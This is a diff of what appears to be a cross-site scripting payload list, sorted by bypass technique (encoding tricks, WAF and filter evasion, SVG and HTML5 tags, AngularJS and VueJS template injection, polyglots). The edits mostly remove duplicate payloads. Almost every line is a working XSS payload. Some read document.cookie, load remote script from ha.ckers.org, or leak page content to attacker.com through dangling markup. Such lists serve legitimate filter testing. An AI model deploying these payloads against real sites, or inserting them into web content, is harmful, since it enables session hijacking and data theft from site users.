@@ -22,7 +22,6 @@
 # Case variation bypass
 <ScRipT>alert("XSS");</ScRipT>
 <ScRiPt>alert(1)</sCriPt>
-<scr<script>ipt>alert(1)</scr</script>ipt>
 foo<script>alert(1)</script>
 foo<script>alert(document.cookie)</script>
 
@@ -68,18 +67,12 @@ foo\'; alert(document.cookie);//';
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=javascrscriptipt:alert('XSS')>
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 <img src ?itworksonchrome?\/onerror = alert(1)
 <img src=asdf onerror=alert(document.cookie)>
 "><img src=x onerror=window.open('https://www.google.com/');>
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
-<IMG SRC=javascript:alert('XSS')>
-<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 
 # SVG XSS
 <svg/onload=alert('XSS')>
@@ -227,7 +220,6 @@ javascript:alert("hellox worldss")
 <script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
 <script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<<SCRIPT>alert("XSS");//<</SCRIPT>
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
@@ -333,7 +325,6 @@ exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("
 &lt;SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"&gt;&lt;/SCRIPT&gt;
 <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
-<script src="data:text/javascript,alert(1)"></script>
  <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 
 # Script attributes XSS
@@ -397,7 +388,6 @@ http://www.<script>alert(1)</script .com
 # Whitespace/special character bypass
 <BODY onload!#$%&()*~+-_.,;?@[/|\]^`=alert("XSS")>
 <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 
 # Null byte bypass
 perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
@@ -416,7 +406,6 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 &#00060
 &#000060
 &#0000060
-&lt;
 &#x3c
 &#x03c
 &#x003c
@@ -552,7 +541,6 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 <div ng-app ng-csp><div ng-controller="test">{{$eval.constructor('alert(1)')()}}</div></div>
 
 # VueJS template injection
-{{constructor.constructor('alert(1)')()}}
 {{_c.constructor('alert(1)')()}}
 <div v-html="'<img src=x onerror=alert(1)>'"></div>
 
@@ -571,8 +559,6 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 <form name=test><input id=attributes></form>
 
 # Polyglot XSS
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 
 # HTML5 new tags
 <details open ontoggle=alert(1)>
@@ -608,6 +594,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # XSLT XSS
 <xsl:value-of select="system-property('xsl:vendor')"/>
+# The script line is the basic payload; it stays because it is inside this XSLT sample.
 <xsl:template match="/">
 <script>alert(1)</script>
 </xsl:template>
@@ -636,7 +623,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # WAF bypass with comments
 <scr<!---->ipt>alert(1)</scr<!---->ipt>
-<scr<script>ipt>alert(1)</scr</script>ipt>
 
 # WAF bypass with null bytes
 <script\x00>alert(1)</script>
@@ -670,8 +656,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 # Script gadgets
 <div id=x tabindex=1 onfocus=alert(1)></div><input value=clickme>
-<input onfocus=alert(1) autofocus>
-<input onblur=alert(1) autofocus><input autofocus>
 <video poster=javascript:alert(1)//></video>
 <body onload=alert(1)>
 <body oninput=alert(1)><input autofocus>
@@ -685,8 +669,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 '><img src='//attacker.com?
 
 # AngularJS 1.6+ sandbox bypass
-{{constructor.constructor('alert(1)')()}}
-{{$on.constructor('alert(1)')()}}
 {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
 
 # Template literals
@@ -708,7 +690,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <img src=x onerror = alert(1)>
 
 # Without quotes
-<img src=x onerror=alert(1)>
 <img src=x onerror=alert`1`>
 <img src=x onerror=alert(document.domain)>
 
@@ -729,7 +710,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 <object data="data:text/html,<script>alert(1)</script>">
 
 # Embed src XSS
-<embed src="javascript:alert(1)">
 <embed src="data:text/html,<script>alert(1)</script>">
 
 # Applet XSS
